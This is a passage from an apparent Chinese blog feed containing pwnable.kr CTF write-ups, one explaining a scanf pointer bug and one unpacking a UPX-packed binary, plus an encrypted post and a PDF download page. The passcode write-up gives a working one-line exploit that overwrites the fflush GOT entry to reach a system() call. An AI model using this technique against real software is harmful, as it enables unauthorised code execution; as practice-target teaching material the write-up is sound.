d98feee6ec8541e7a3865cd7e778c5de9263cce52b83f60f3c7fc073bbd718fd701b37a895fc877c3d2b2e38077e97f5f7b671b66cf33afc89f420d82b7524f75a7cf2e811cba3adc5e00f04a01b3e5596bc933a5cf55e290bb9260d490bbff8075670f89d5f91d81766b9ec14684a0534713ca43e50182efd208165795fb9100b71937c16d038cb6797ce8656ccc67150e4222a0f99cf5aad7f8952339c5bd73ace394ac4a40ef542b6340d1b7a13dc5026cbe8c29dbae3b91bc4d6492b352241c98ead1eeffe5ce25f9308d80a314295c60896ad6457c9058ed19f887ba3d747f5b3d508de270dd01acced5780ac795a2964642fd4b5b6c9de8389b5708945ad742ff8abe82900ef1783435aab296f7a71c9f1188be9bd4e330f378064e2b7d1361b167d52d3d1e4ca5d3aa4703c83806b94619c4e3e16eb911800ea6343372bb8a8f292db93e8deebbcf7632e3753dde1d2127d6df10131e5939f9e3527502c0150509e558b3b1b4530a694d8e33ba6eacfb6e1a401cf22d627bbda6bb15c3f4d02853ef403ee5ff0fddd154fbfe7cc3ba42de80c11570ec41f0a7b7a4c46e359abbb2125dfdcd29d44d723e4be11fbed969404aa2a50363d5881e316a3a953b90bff775e0e20a2a71595af2238e6678203d7a2c187540f75aa7c55e1d95eeb42ec5ed7ddd6da70b831370d73decbb0698f7cd4f8c5fc079f3bd054730bba8d31a06129f4fae3f41212a5111430ea35fd04803e76528a777f5b5c49e4897a29e7fea747ae49e6f98e0f56d76af3662e5150486ba5a5efaed8b7edee227a05b5e6f0f18bafb7f3faae19b5d518cb47b8583d7b52a075a614431265ed3be35c6ce149dd8865de784132efedd94641d10341e6ff07a837fc9a272c62021197799965044bdc3990e12f07d7dc21d7af5f11b0b6a5b19fff77f74e1dee10df106a8f3cf22b83c4f61fd931191983e2406ccd98d98905d607ab9d246a5382aacda3d2a10e22ca6598aba8e9f5f14f79b45c67cd41bf9a6e4d735c71595d7ca6b8760f49db4e6ad89383cb58af92aae2dbf177acbaeb5ba66a57852c8dcd9e3849cc26bb1e4f66649da0631d62291f1865a384fe5c2a8320b256c0c3dc267403c56d50144d0972fe458ea6d7648dac2d8de91183478c948c4d30521c421f858f204419a4f43816d13e3c4d7cde0ca15ffb2e485dbcd0c98c328eb4e723ad3d2c6f5c0ea4420da7461d4ac22d970b80cfb2da85853029009622c9b0b515de5489bee77bba4793f818731f48593a39abdb09549bf26e8091d4fc3a059f761b804349d374ea8a543d4527cc26acf1845bf2c9c0b4904b01d3ca1af2a61ba2a9bd11c9bb92b863866ab76bbcc7c8a6fd82ee4d1307d64aae1fdf9933aab586f51b704e9704ff752459c9df9a3f0feaa00fbc2219f95ac52e4ac81ab099ecf362c9da287711e98a7fe34f82202086cc9773a9b1f2ae790408a86fb22a97ecbb347e2cdf1ff8472d3b64760ecac5c8d660174d44da8bbaee6839dfec4dadb66c493d9ba026fdab8b4c86d5bcea23dca2c424e9069eb6ac8db2a4c8f84c54cfb7890b645d83192b943115df0e48812e367d26e816b9da170861eea8acb1483b8be528a1287cc536e3715b1f359ee893a22e7102f616d86c030bfc572135db03e78236084108aa55d7b7797deb2ceaf4be438f68d4404b2e7243c6fb33f9694a2aefdc51bde27e542032ad4995b67cd4e9b308446e8cfaed9866cab85f021daa6a24a79394a7e7818b4c74489a61e2bec95c04c11a7aed63a3502a75e92040c53286d361f4d6ba20508cae4fcd789f3e5ab92ab90812f25653ac4aa6c38b1d8096d0d42988b2e207d6b81b3c60c07df988a8f3f694e42b0095c00c427117f48fe74b9a8ccb6a81b44caa622a798d6349a1b024fe1e7ea631660ba64ca45fd56eb6fe4d048f5969150022fe96f0007c43a03970203192b0e3535cf53bf24531320725a5819248fff56b867508fe9e061af62f878b0225ef88963b8ec67c6b12f2e0beb2f638d03a9a4bfbec141d7b0dd40563b51aeec6356fe27d1ef5b108c0a2d98510a0cfba032aa0b9ba50efd4415c80e7bad33509c47cf286d696cd32794eab0498072593da688613a9ff5018d2b</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Pwnable.kr的奇幻之旅（五）[passcode]</title>
    <link href="https://muzibing.github.io/2020/05/15/2020.05.05%EF%BC%88117%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/05/15/2020.05.05（117）/</id>
    <published>2020-05-14T16:00:00.000Z</published>
    <updated>2020-05-16T01:23:30.868Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a><font color="navy">一、基础知识</font></h3><h4 id="1-mov-eax-gs-0x14指令的作用"><a href="#1-mov-eax-gs-0x14指令的作用" class="headerlink" title="1.mov    eax,gs:0x14指令的作用"></a><font color="blue">1.<code>mov    eax,gs:0x14</code>指令的作用</font></h4><blockquote><p>gcc编译器专门为防止缓冲区溢出而采取的保护措施，具体方法是gcc首先在缓冲区被写入之前在buf的结束地址之后返回地址之前放入随机的gs验证码，并在缓冲区写入操作结束时检验该值。通常缓冲区溢出会从低地址到高地址覆写内存，所以如果要覆写返回地址，则需要覆写该gs验证码。这样就可以通过比较写入前和写入后gs验证码的数据，判断是否产生溢出。</p></blockquote><p>简单来说就是，<code>从gs:0x14的地方取出来，然后在函数返回之前对比栈中的这个随机值和gs:0x14来断定是否发生栈溢出</code>。    </p><h4 id="2-lea和mov指令的区别"><a href="#2-lea和mov指令的区别" class="headerlink" title="2.lea和mov指令的区别"></a><font color="blue">2.<code>lea</code>和<code>mov</code>指令的区别</font></h4><p>◫ <code>lea</code>：将<code>源操作数的地址</code>传到目的操作数中</p><p>◫ <code>mov</code>：将<code>数据从源操作数</code>传到目的操作数中</p><p>例如：The address of ebx is <code>0xffe1c1e8</code> and data is <code>0xf7fadd20</code> in  <code>0xffe1c178</code>(<code>0xffe1c1e8-0x70</code>). </p><p>⇱ <code>lea edx,[ebx-0x70]</code>：是将<code>ebx-0x70</code>的地址  <code>0xffe1c178</code>传到<code>edx</code>寄存器中</p><p>⇱ <code>mov edx,[ebx-0x70]</code>：是将<code>ebx-0x70</code>地址中的数据<code>0xf7fadd20</code>传到<code>edx</code>寄存器中</p><p><img src="/images/117-1.png" alt></p><h4 id="3-scanf的原理"><a href="#3-scanf的原理" class="headerlink" title="3.scanf的原理"></a><font color="blue">3.<code>scanf</code>的原理</font></h4><p>需要注意的是：</p><blockquote><ol><li>用户输入的字符，会以<code>ASCII码形式</code>存储在键盘缓冲区；</li><li>每调用一次scanf函数，就从<font color="navy">键盘缓冲区读走一个字符，相当于清除缓冲区</font>；</li><li>若用户一次输入n个字符，则前n次调用scanf函数都不需要用户再次输入，直到把缓冲区的数据全部读取(清除)干净；</li><li>scanf取地址<code>&amp;</code>符号的作用：是将从键盘缓冲区读取的字符放到<code>&amp;var</code>地址中，其中字符串无需&amp;，因为字符串本身就代表地址的开始；</li><li>调用scanf()函数时，用户最后输入的回车也会储存在键盘缓冲区；(见如下程序)</li></ol></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, c);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, c);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">程序在VC++6.0中的显示结果是：</span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">49</span></span><br><span class="line"><span class="comment">10</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><blockquote><p>下面以一个例子做个简单介绍：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(ch)</span><br><span class="line">        &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'1'</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"case1\n"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'2'</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"case2\n"</span>);</span><br><span class="line">                <span class="comment">// fflush(stdin);    //清除缓冲区</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"case3\n"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'e'</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输入：</span></span><br><span class="line"><span class="comment">1235</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">case1</span></span><br><span class="line"><span class="comment">case2</span></span><br><span class="line"><span class="comment">case3</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输入：</span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">case1</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>对于第二个输入1，为什么不会继续循环呢？</p><blockquote><p>因为当输入“1”后，相当于输入了“1”和“回车”，键盘缓冲区将保存它们的ASCII码：49 10，但是因为scanf(“%c”,&amp;a);语句将把ASCII码49送入a中，所以第一次执行完scanf(“%c”,&amp;a);语句后，键盘缓冲区中剩下的内容为：10，然后进入switch语句，因为现在a=’1’，所以执行case ‘1’分支，break后继续while循环，开始第二次执行scanf(“%c”,&amp;a);语句，但这次程序不会停下来等待输入，因为键盘缓冲区中还有剩余的ASCII码：10。因此第二次执行scanf(“%c”,&amp;a);语句时，程序直接将缓冲区中的ASCII码10送入a中，接着又进入switch语句，但是现在a=’CR’，所以转到default分支，执行return后退出循环和函数。</p></blockquote><h3 id="二、题目分析"><a href="#二、题目分析" class="headerlink" title="二、题目分析"></a><font color="navy">二、题目分析</font></h3><p>1.首先连上服务器看一下<code>passcode.c</code>文件：</p><p><img src="/images/117-2.png" alt></p><blockquote><p>从图中可以看出，<code>main</code>函数中先后调用了两个函数，即<code>welcome</code>和<code>login</code>函数：</p><ul><li>在<code>welcome</code>函数中，需要输入长度为100的<code>name</code>字符串；</li><li>在<code>login</code>函数中需要输入两个变量的值<code>passcode1</code>和<code>passcode2</code>，并且在输入<code>passcode1</code>后清除了<code>stdin</code>中的缓存，也就是防止在输入<code>passcode1</code>的时候，将值给<code>passcode1</code>。更为重要的一点是该函数中的两个<code>scanf</code>输入整数类型时，没有加<code>&amp;</code>符号，也就意味着<code>将passcode1和passcode2中的值当作地址，然后将键盘中的缓存输入这两个地址指向的内存中，</code>示意图如下：</li></ul></blockquote><p><img src="/images/117-3.png" alt></p><blockquote><ul><li>如果带有<code>&amp;</code>符号，正常的情况下如下图：</li></ul></blockquote><p><img src="/images/117-4.png" alt></p><p>2.<code>file passcode</code>查看一下ELF文件的格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">passcode@pwnable:~$ file passcode</span><br><span class="line">passcode: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=d2b7bd64f70e46b1b0eb7036b35b24a651c3666b, not stripped</span><br></pre></td></tr></table></figure><blockquote><p>可得可执行文件<code>passcode</code>是一个32位的ELF可执行文件</p></blockquote><p>3.<code>checksec passcode</code>查看一下该可执行文件开启了什么保护：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">passcode@pwnable:~$ checksec passcode</span><br><span class="line">[*] &apos;/home/passcode/passcode&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELROd</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><blockquote><p>可得：</p><ul><li>对GOT表具有写的权限</li><li>开启了Cookie，也就是金丝雀保护</li><li>栈不可知性</li><li>没有内存开启地址随机化</li></ul></blockquote><p>4.如何才能执行<code>system</code>函数？</p><blockquote><ul><li>第一种方法就是使得<code>passcode1==338150 &amp;&amp; passcode2==13371337</code>，但是我们无法往passcode1和passcode2中再写入值，而是只能向这两个变量中的值所指向的内存地址写入值，那么这种方法❌</li><li>第二种方法就是通过变量<code>name</code>的输入实现栈溢出，但是passcode开启了金丝雀，所以无法实现栈溢出❌</li><li>第三种方法就是利用ret2libc技术✔</li></ul></blockquote><h3 id="三、解题步骤"><a href="#三、解题步骤" class="headerlink" title="三、解题步骤"></a><font color="navy">三、解题步骤</font></h3><p>1.<code>scp -P 2222 passcode@pwnable:home/passcode/passcode /tmp</code>将<code>passcode</code>从远程服务器上下载到本地，然后用gdb进行调试，寻找<code>name</code>、<code>passcode1</code>和<code>passcode2</code>的位置：</p><p><img src="/images/117-5.png" alt></p><blockquote><p>从上图可以看出<code>name</code>的起始地址为<code>ebp-0x70</code>，在本次调试中为<code>0xffd3bdc8</code></p></blockquote><p><img src="/images/117-6.png" alt></p><blockquote><p>从上图可以看出<code>passcode1</code>的起始地址为<code>ebp-0x10</code>，在本次调试中为<code>0xffd3be28</code>，而<code>0xffd3be28</code>中的值指向了<code>0xffd3be84</code>，<code>0xffd3be84</code>中的值为0</p></blockquote><p><img src="/images/117-7.png" alt></p><blockquote><p>从上图可以看出<code>passcode2</code>的起始地址为<code>ebp-0xc</code>，在本次调试中为<code>0xffd3be2c</code>，而<code>0xffd3be2c</code>中的值指向了<code>0x3b8fa100</code></p></blockquote><p>虽然都是<code>ebp-.</code>但是对于<code>welcome</code>和<code>login</code>函数中的<code>ebp</code>是否一样呢？我们看上面的三张图片：</p><ul><li>第一张是<code>welcome</code>函数的，其中<code>ebp</code>的地址为<code>EBP: 0xffd3be38 --&gt; 0xffd3be58 --&gt; 0x0</code></li><li>第二张是<code>login</code>函数的，其中<code>ebp</code>的地址为<code>EBP: 0xffd3be38 --&gt; 0xffd3be58 --&gt; 0x0</code></li></ul><p>所以可以得到如下的示意图：</p><p><img src="/images/117-8.png" alt></p><p>2.通过题目中的<code>passcode.c</code>源码以及gdb的调试结果可以得到，passcode1的位置处于name内存的最后四个字节，可以通过上面的示意图得出该结论，因此我们可以在输入<code>name</code>变量值的时候，将<code>passcode1</code>中的值进行修改，可以使得我们往特定的地址输入值，那么我们可以利用该思想进行绕过。我们看一下 system(“/bin/cat flag”);语句前面是printf(“Login OK!\n”);语句，我们是不是可以绕过if的判断条件，直接执行printf(“Login OK!\n”);语句或者system(“/bin/cat flag”);，在这里我们可以修改<code>fflush</code>函数的<strong>GOT表</strong>，要注意这里修改的是GOT表，因为<code>RELRO: Partial RELROd</code>说明GOT表具有可写的权力，具体的如下方的示意图：</p><p><img src="/images/117-9.png" alt></p><p>3.上图只是一个大概的过程，可知我们的构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;print &apos;A&apos;*96+&apos;\x00\xa0\x04\x08&apos;+&apos;\n&apos;+&apos;134514135&apos;+&apos;\n&apos;&quot;| ./passcode</span><br></pre></td></tr></table></figure><p>得到如下结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Toddler&apos;s Secure Login System 1.0 beta.</span><br><span class="line">enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!</span><br><span class="line">enter passcode1 : Login OK!</span><br><span class="line">Sorry mom.. I got confused about scanf usage :(</span><br><span class="line">Now I can safely trust you that you have credential :)</span><br></pre></td></tr></table></figure><blockquote><p>这里要注意的是：</p><ul><li>在修改<code>0x804a004</code>时要用小段进行书写，因为<code>Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00</code>魔数的第6个字是<code>01</code>代表小段。</li><li>在输入<code>0x80485d7</code>时，因为要求是整数，所以要将<code>0x80485d7</code>变为<code>134514135</code></li></ul></blockquote><h3 id="四、参考文章"><a href="#四、参考文章" class="headerlink" title="四、参考文章"></a><font color="navy">四、参考文章</font></h3><blockquote><ol><li><a href="https://www.jianshu.com/p/47d484b9227e" target="_blank" rel="noopener">栈溢出攻击及防护方法简介</a></li><li><a href="https://paper.seebug.org/271/" target="_blank" rel="noopener">手把手教你栈溢出从入门到放弃（上）</a></li><li><a href="https://github.com/JnuSimba/LinuxSecNotes/blob/master/Linux%20%E7%B3%BB%E7%BB%9F%E5%BA%95%E5%B1%82%E7%9F%A5%E8%AF%86/Linux%20%E6%A0%88%E6%BA%A2%E5%87%BA%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6.md" target="_blank" rel="noopener">Linux 栈溢出保护机制</a></li><li><a href="https://zhuanlan.zhihu.com/p/33360460" target="_blank" rel="noopener">键盘缓冲区（scanf原理）</a></li><li><a href="https://www.cnblogs.com/qihuanye-229110/articles/11149715.html" target="_blank" rel="noopener">C语言scanf函数原理</a></li><li><a href="https://www.cnblogs.com/shuaishuaidefeizhu/p/5886899.html" target="_blank" rel="noopener">scanf()函数原理</a></li><li><a href="https://bbs.pediy.com/thread-247956.htm" target="_blank" rel="noopener">[原创]pwnable.kr passcode</a></li></ol></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、基础知识&quot;&gt;&lt;a href=&quot;#一、基础知识&quot; class=&quot;headerlink&quot; title=&quot;一、基础知识&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;一、基础知识&lt;/font&gt;&lt;/h3&gt;&lt;h4 id=&quot;1-mov-eax-gs-0x14指令的作用&quot;
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="https://muzibing.github.io/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>《梦炬手册》五周年纪念版下载页</title>
    <link href="https://muzibing.github.io/2020/05/04/2020.05.04%EF%BC%88116%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/05/04/2020.05.04（116）/</id>
    <published>2020-05-03T16:00:00.000Z</published>
    <updated>2020-05-04T10:28:31.938Z</updated>
    
    <content type="html"><![CDATA[<p><a href="/pdf/《梦炬手册》.pdf">点击下载文件</a></p><object data="/pdf/《梦炬手册》.pdf" type="application/pdf" width="100%" height="1000"></object>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;/pdf/《梦炬手册》.pdf&quot;&gt;点击下载文件&lt;/a&gt;&lt;/p&gt;
&lt;object data=&quot;/pdf/《梦炬手册》.pdf&quot; type=&quot;application/pdf&quot; width=&quot;100%&quot; height=&quot;1000&quot;&gt;


&lt;/object&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Pwnable.kr的奇幻之旅（四）[flag]</title>
    <link href="https://muzibing.github.io/2020/05/02/2020.05.02%EF%BC%88115%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/05/02/2020.05.02（115）/</id>
    <published>2020-05-01T16:00:00.000Z</published>
    <updated>2020-05-15T14:09:09.834Z</updated>
    
    <content type="html"><![CDATA[<iframe src="//player.bilibili.com/player.html?aid=412935552&bvid=BV1FV411d7u7&cid=186570036&page=2" scrolling="no" border="0" frameborder="0" framespacing="0" allowfullscreen="true" width="100%" height="500"> </iframe><!--五四特别博客：内附何冰五四演讲视频《后浪》，致敬五四青年，奋发有为！--><h3 id="0x00-相关知识"><a href="#0x00-相关知识" class="headerlink" title="0x00 相关知识"></a><font color="navy"><code>0x00 相关知识</code></font></h3><h4 id="1-UPX-加壳"><a href="#1-UPX-加壳" class="headerlink" title="1.UPX 加壳"></a><font color="blue"><code>1.UPX 加壳</code></font></h4><blockquote><p>这里就简单介绍一下UPX加壳的原理，详细内容以后会进行专题研究。</p></blockquote><p><img src="/images/115-1.png" alt></p><p>通过上图可以看出最重要的部分应该为<code>Compressed data</code>和<code>Stub</code>，下面简单的讲一下UPX加壳的原理以及加壳后如何执行程序。</p><p><code>UPX的工作原理如下</code>：首先将程序压缩， 所谓的压缩包括两方面：  </p><ul><li><p>一方面在程序的开头或者其他合适的地方插入一段代码</p></li><li><p>另一方面是将程序的其他地方做压缩（也就是上面讲到的压缩），压缩也可以叫做加密，因为压缩后的程序比较难看懂，原来的代码有很大的不同；</p></li></ul><p>当程序执行时：实时的对程序解压缩。解压缩功能是在<code>Stub</code>节区插入的代码完成的功能，联起来就是：upx可以完成代码的压缩和实时解压执行。且不会影响程序的执行效率。</p><p><img src="/images/115-2.png" alt></p><p>从上图可以看出在加壳后代码段的信息被压缩成<code>Compressed Data</code>节区，那么在运行时程序会根据<code>Stub</code>节区的内容将<code>Compressed Data</code>进行解压然后运行程序。</p><h3 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a><font color="navy"><code>0x01 题目分析</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@kali:~/Documents/CTF/PWN/pwnable.kr/flag# file flag </span><br><span class="line">flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header</span><br></pre></td></tr></table></figure><blockquote><p>查看文件信息，从得到的结果可以看出flag是一个64位ELF文件。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Documents/CTF/PWN/pwnable.kr/flag# checksec flag </span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/pwnable.kr/flag/flag&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">    Packer:   Packed with UPX</span><br></pre></td></tr></table></figure><blockquote><p>检查flag文件开启了什么保护，通过结果可以看出：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① 对GOT表可写可读</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② 没有开启金丝雀保护</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③ 栈可执行</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;④ 没有开启地址随机化</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑤ 有可写可读可执行段</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑥ 进行UPX加壳</p><p>可以看出flag文件的大部分保护都没有开启，只是有了一个UPX加壳</p></blockquote><h3 id="0x02-解题步骤"><a href="#0x02-解题步骤" class="headerlink" title="0x02 解题步骤"></a><font color="navy"><code>0x02 解题步骤</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Documents/CTF/PWN/pwnable.kr/flag# upx -d f1ag -o flag</span><br><span class="line">                       Ultimate Packer for eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2018</span><br><span class="line">UPX 3.95        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Aug 26th 2018</span><br><span class="line"></span><br><span class="line">        File size         Ratio      Format      Name</span><br><span class="line">   --------------------   ------   -----------   -----------</span><br><span class="line">    883745 &lt;-    335288   37.94%   linux/amd64   flag</span><br><span class="line"></span><br><span class="line">Unpacked 1 file.</span><br></pre></td></tr></table></figure><blockquote><p>① 对flag文件进行脱壳，得到一个脱壳后的flag，其中文件由335288bits扩展成883745bits，格式是Linux环境下的amd64</p><p>② 然后用IDA-64打开脱壳后的flag文件，得到<code>main</code>函数伪代码：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"I will malloc() and strcpy the flag there. take it."</span>, argv, envp);</span><br><span class="line">  LODWORD(v3) = <span class="built_in">malloc</span>(<span class="number">100L</span>L);</span><br><span class="line">  sub_400320(v3, flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>可以看到<code>sub_400320</code>函数的第二个参数为flag，双击参数flag，得到我们想要的flag。</p></blockquote><p><img src="/images/115-3.png" alt></p><h3 id="0x03-参考文章"><a href="#0x03-参考文章" class="headerlink" title="0x03 参考文章"></a><font color="navy"><code>0x03 参考文章</code></font></h3><ul><li><p><a href="https://bbs.pediy.com/thread-248779.htm" target="_blank" rel="noopener">upx原理分析</a></p></li><li><p><a href="https://www.cnblogs.com/iBinary/p/7764483.html" target="_blank" rel="noopener">脱壳第三讲,UPX压缩壳,以及补充壳知识</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;iframe src=&quot;//player.bilibili.com/player.html?aid=412935552&amp;bvid=BV1FV411d7u7&amp;cid=186570036&amp;page=2&quot; scrolling=&quot;no&quot; border=&quot;0&quot; frameborder=&quot;
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
